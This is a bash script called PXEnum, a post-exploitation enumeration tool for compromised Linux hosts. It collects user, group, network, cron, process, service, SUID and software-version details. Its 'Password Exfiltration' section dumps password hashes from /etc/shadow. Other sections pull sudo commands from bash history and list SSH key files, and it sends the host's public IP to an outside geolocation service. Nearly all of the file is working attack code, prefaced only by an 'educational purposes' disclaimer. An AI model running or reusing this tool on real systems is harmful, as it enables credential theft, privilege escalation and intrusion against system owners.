#!/bin/bash

echo "\e[31mPXEnum\e[39m"
echo "\e[31mP\e[39most e\e[31mX\e[39mploitation \e[31mEnum\e[39meration"
echo "\e[31mVersion : \e[39mv1.0"
echo "\e[31mAuthor  : \e[39mShawn Duong"
echo "\e[31mEmail   : \e[39mshawnduong@protonmail.com"
echo "\e[31mGitHub  : \e[39mhttps://github.com/shawnduong"
echo 
echo "\e[1;31mDISCLAIMER"
echo "THIS TOOL IS MEANT TO BE USED FOR EDUCATIONAL PURPOSES ONLY."
echo "I AM NOT LIABLE FOR ANY DAMAGES CAUSED BY MISUSE OF THIS SOFTWARE.\e[0;39m"
echo

echo "\e[31m--Basic Info--\e[39m"
user=`whoami` 2>/dev/null
echo "\e[36mLogged in as : \e[39m$user"
host=`uname -n` 2>/dev/null
echo "\e[36mLogged into  : \e[39m$host"
home=`echo $HOME` 2>/dev/null
echo "\e[36mHome         : \e[39m$home"
uid=`id -u` 2>/dev/null
echo "\e[36mUser ID      : \e[39m$uid"
groups=`groups | sort` 2>/dev/null
echo "\e[36mGroups       : \e[39m$groups"
kernel=`uname -s` 2>/dev/null
echo "\e[36mKernel       : \e[39m$kernel"
release=`uname -r` 2>/dev/null
echo "\e[36mRelease      : \e[39m$release"
version=`uname -v` 2>/dev/null
echo "\e[36mVersion      : \e[39m$version"
architecture=`uname -p` 2>/dev/null
echo "\e[36mArchitecture : \e[39m$architecture"
os=`uname -o` 2>/dev/null
echo "\e[36mOS           : \e[39m$os"
echo

echo "\e[31m--Hardware Info--\e[39m"
cpu=`lscpu | grep 'Model name:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
echo "\e[36mCPU            : \e[39m$cpu"
gpu=`lshw -C display | grep "product:" | awk -F ': ' '{print $2}'` 2>/dev/null
echo "\e[36mGPU            : \e[39m$gpu"
echo "\e[36mArchitecture   : \e[39m$architecture"
memOnline=`lsmem | grep 'Total online memory:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
echo "\e[36mOnline memory  : \e[39m$memOnline"
memOffline=`lsmem | grep 'Total offline memory:' | awk -F ':' '{print $2}' | awk '{$1=$1};1'` 2>/dev/null
echo "\e[36mOffline memory : \e[39m$memOffline"
echo

echo "\e[31m--BIOS Info--\e[39m"
biosVendor=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Vendor' | awk -F ': ' '{print $2}'` 2>/dev/null
echo "\e[36mBIOS Vendor       : \e[39m$biosVendor"
biosVersion=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Version' | awk -F ': ' '{print $2}'` 2>/dev/null
echo "\e[36mBIOS Version      : \e[39m$biosVersion"
biosReleaseDate=`dmidecode | grep 'BIOS Information' -A 5 | grep 'Release Date' | awk -F ': ' '{print $2}'` 2>/dev/null
echo "\e[36mBIOS Release Date : \e[39m$biosReleaseDate"
echo

echo "\e[31m--User Info--\e[39m"
users=`awk -F: '{print $1}' /etc/passwd | sort | tr '\n' ' '` 2>/dev/null
echo "\e[36mAll users        : \e[39m$users"
groups=`cut -d: -f1 /etc/group | sort | tr '\n' ' '` 2>/dev/null
echo "\e[36mAll groups       : \e[39m$groups"
sudoers=`cat /etc/group | grep 'sudo' | awk -F ':' '{print $4}' | tr '\n' ' '` 2>/dev/null
echo "\e[36mSuper users      : \e[39m$sudoers"
usersUIDs=`awk -F: '{printf "%s:%s\n",$1,$3}' /etc/passwd | sort | tr '\n' ' '` 2>/dev/null
echo "\e[36mAll users + UIDs : \e[39m$usersUIDs"
onlineUsers=`users` 2>/dev/null
echo "\e[36mLogged in users  : \e[39m$onlineUsers"
homedUsers=`cat /etc/passwd | grep '/home/' | awk -F: '{print $1}' | sort | tr '\n' ' '` 2>/dev/null
echo "\e[36mUsers with homes : \e[39m$homedUsers"
userHomes=`cat /etc/passwd | grep '/home/' | awk -F: '{printf "%s:%s\n",$1,$6}' | sort | tr '\n' ' '` 2>/dev/null
echo "\e[36mUser homes       : \e[39m$userHomes"
wOut=`w` 2>/dev/null
echo "\e[36mw output         : \e[39m"
echo "$wOut"
whoOut=`who` 2>/dev/null
echo "\e[36mwho output       : \e[39m"
echo "$whoOut"
echo

echo "\e[31m--Network Info--\e[39m"
interfaces=`ip link show | sed '0~2d' | awk -F ': ' '{print $2}' | sort | tr '\n' ' '` 2>/dev/null
echo "\e[36mNetwork interfaces  : \e[39m$interfaces"
macs=`ip -o link  | awk '{print $2,$(NF-2)}' | tr '\n' ' '` 2>/dev/null
echo "\e[36mMAC Addresses       : \e[39m$macs"
localIPs=`ifconfig | grep 'inet ' | awk -F ' ' '{print $2}' | tr '\n' ' '` 2>/dev/null
echo "\e[36mLocal IP addresses  : \e[39m$localIPs"
routerIP=`ip route | grep 'default' | awk -F ' ' '{print $3}'` 2>/dev/null
echo "\e[36mRouter IP addresses : \e[39m$routerIP"
openPorts=`netstat -tulpn | grep 'LISTEN' | awk -F ' ' '{print $4}' | tr '\n' ' '` 2>/dev/null
echo "\e[36mLocally open ports  : \e[39m$openPorts"
publicIP=`dig +short myip.opendns.com @resolver1.opendns.com` 2>/dev/null
echo "\e[36mPublic IP address   : \e[39m$publicIP"
echo

echo "\e[31m--Location Info (Based on Network)--\e[39m"
info=`curl http://ip-api.com/line/$publicIP` 2>/dev/null
country=`echo "$info" | sed '2!d'` 2>/dev/null
echo "\e[36mCountry      : \e[39m$country"
region=`echo "$info" | sed '5!d'` 2>/dev/null
echo "\e[36mRegion       : \e[39m$region"
city=`echo "$info" | sed '6!d'` 2>/dev/null
echo "\e[36mCity         : \e[39m$city"
zip=`echo "$info" | sed '7!d'` 2>/dev/null
echo "\e[36mZIP Code     : \e[39m$zip"
lat=`echo "$info" | sed '8!d'` 2>/dev/null
lon=`echo "$info" | sed '9!d'` 2>/dev/null
echo "\e[36mlat, lon     : \e[39m$lat $lon"
timezone=`echo "$info" | sed '10!d'` 2>/dev/null
echo "\e[36mTime zone    : \e[39m$timezone"
isp=`echo "$info" | sed '11!d'` 2>/dev/null
echo "\e[36mISP          : \e[39m$isp"
organization=`echo "$info" | sed '12!d'` 2>/dev/null
echo "\e[36mOrganization : \e[39m$organization"
asn=`echo "$info" | sed '13!d'` 2>/dev/null
echo "\e[36mAS Number    : \e[39m$asn"
echo

echo "\e[31m--Cron Info--\e[39m"
crond=`ls /etc/cron.d/ | tr '\n' ' '` 2>/dev/null
echo "\e[36mcron.d       : \e[39m$crond"
cronhourly=`ls /etc/cron.hourly/ | tr '\n' ' '` 2>/dev/null
echo "\e[36mcron.hourly  : \e[39m$cronhourly"
crondaily=`ls /etc/cron.daily/ | tr '\n' ' '` 2>/dev/null
echo "\e[36mcron.daily   : \e[39m$crondaily"
cronweekly=`ls /etc/cron.weekly/ | tr '\n' ' '` 2>/dev/null
echo "\e[36mcron.weekly  : \e[39m$cronweekly"
cronmonthly=`ls /etc/cron.monthly/ | tr '\n' ' '` 2>/dev/null
echo "\e[36mcron.monthly : \e[39m$cronmonthly"
echo

echo "\e[31m--Processes--\e[39m"
echo "\e[36mUser processes (excluding GNOME/KDE) : \e[39m"
echo "\e[36mPID\tProcess\e[39m"
processes=`ps -u | sed '1d' | awk -F ' ' '{printf "%s\t%s\n", $2, $11}' | grep -v 'gnome\|kde'` 2>/dev/null
echo "$processes"
echo

echo "\e[31m--Services--\e[39m"
onlineServices=`service --status-all | grep '\[ + \]'` 2>/dev/null
echo "\e[36mOnline  : \e[39m"
echo "$onlineServices"
offlineServices=`service --status-all | grep '\[ - \]'` 2>/dev/null
echo "\e[36mOffline : \e[39m"
echo "$offlineServices"
echo

echo "\e[31m--Password Exfiltration--\e[39m"
passwords=`cat /etc/shadow | grep -v "*\|!" | sort` 2>/dev/null
echo "\e[36mSuccessfully exfiltrated passwords : \e[39m$passwords"
echo

echo "\e[31m--SetUID/SetGID Files--\e[39m"
suidFiles=`find / -perm /6000` 2>/dev/null
echo "\e[36mFound : \e[39m"
echo "$suidFiles"
echo

echo "\e[31m--sudo History--\e[39m"
sudoHistory=`cat ~/.bash_history | grep 'sudo'` 2>/dev/null
echo "\e[36mHistory : \e[39m"
echo "$sudoHistory"
echo

echo "\e[31m--SSH Keys--\e[39m"
foundSSHKeys=`ls ~/.ssh/ | grep '.pub\|rsa' | tr '\n' ' '` 2>/dev/null
echo "\e[36mFound (in ~/.ssh/) : \e[39m$foundSSHKeys"
echo

echo "\e[31m--Program Version Info--\e[39m"
bashV=`bash --version | sed '1!d'` 2>/dev/null
echo "\e[36mBash     : \e[39m$bashV"
sudoV=`sudo --version | sed '1!d'` 2>/dev/null
echo "\e[36msudo     : \e[39m$sudoV"
gccV=`gcc --version | sed '1!d'` 2>/dev/null
echo "\e[36mGCC      : \e[39m$gccV"
printf "\e[36mPython 2 : \e[39m$python2V"
python --version
python3V=`python3 --version` 2>/dev/null
echo "\e[36mPython 3 : \e[39m$python3V"
javaV=`java --version | sed '1!d'` 2>/dev/null
echo "\e[36mJava     : \e[39m$javaV"
curlV=`curl --version | sed '1!d' | awk -F ' ' '{printf "%s %s %s", $1, $2, $3}'` 2>/dev/null
echo "\e[36mcURL     : \e[39m$curlV"
wgetV=`wget --version | sed '1!d'` 2>/dev/null
echo "\e[36mwget     : \e[39m$wgetV"
rubyV=`ruby --version` 2>/dev/null
echo "\e[36mRuby     : \e[39m$rubyV"
apache2V=`apache2 -v | sed '1!d' | awk -F ': ' '{print $2}'` 2>/dev/null
echo "\e[36mApache 2 : \e[39m$apache2V"
echo

